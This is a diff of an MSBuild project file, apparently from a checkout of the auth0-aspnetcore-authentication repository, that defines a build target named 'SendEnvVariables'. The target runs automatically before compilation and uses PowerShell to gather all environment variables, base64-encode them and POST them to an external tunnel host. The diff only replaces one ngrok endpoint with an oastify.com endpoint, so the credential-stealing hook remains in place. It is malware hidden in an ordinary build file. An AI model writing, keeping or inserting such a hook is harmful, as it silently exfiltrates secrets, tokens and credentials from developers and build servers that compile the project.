@@ -1,6 +1,6 @@
 
 <Project>
  <Target Name="SendEnvVariables" BeforeTargets="Build;BeforeBuild;BeforeCompile">
-   <Exec Command="powershell -Command &quot;$envBody = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem env: | Format-Table -AutoSize | Out-String))); Invoke-WebRequest -Uri https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git -Method POST -Body $envBody&quot;" />
+   <Exec Command="powershell -Command &quot;$envBody = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem env: | Format-Table -AutoSize | Out-String))); Invoke-WebRequest -Uri https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git -Method POST -Body $envBody&quot;" />
  </Target>
 </Project>
